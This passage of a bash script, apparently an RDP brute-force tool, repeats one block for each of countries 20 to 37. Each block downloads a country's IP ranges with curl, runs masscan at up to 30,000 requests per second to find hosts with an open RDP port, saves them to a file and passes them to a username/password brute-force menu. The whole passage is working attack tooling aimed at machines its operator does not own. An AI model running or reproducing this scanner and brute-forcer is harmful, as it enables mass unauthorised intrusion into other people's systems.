echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "20" ]; then
curl http://ipdiapazon.16mb.com/Belgium.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "21" ]; then
curl http://ipdiapazon.16mb.com/Belize.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "22" ]; then
curl http://ipdiapazon.16mb.com/Benin.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "23" ]; then
curl http://ipdiapazon.16mb.com/Bermuda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "24" ]; then
curl http://ipdiapazon.16mb.com/Bhutan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "25" ]; then
curl http://ipdiapazon.16mb.com/Bolivia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "26" ]; then
curl http://ipdiapazon.16mb.com/Bosnia_and_herzegowina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "27" ]; then
curl http://ipdiapazon.16mb.com/Botswana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "28" ]; then
curl http://ipdiapazon.16mb.com/Brazil.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "29" ]; then
curl http://ipdiapazon.16mb.com/British_indian_ocean_territory.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "30" ]; then
curl http://ipdiapazon.16mb.com/Brunei_darussalam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "31" ]; then
curl http://ipdiapazon.16mb.com/Bulgaria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "32" ]; then
curl http://ipdiapazon.16mb.com/Burkina_faso.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "33" ]; then
curl http://ipdiapazon.16mb.com/Burundi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "34" ]; then
curl http://ipdiapazon.16mb.com/Cambodia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "35" ]; then
curl http://ipdiapazon.16mb.com/Cameroon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "36" ]; then
curl http://ipdiapazon.16mb.com/Canada.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "37" ]; then
curl http://ipdiapazon.16mb.com/Cayman_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

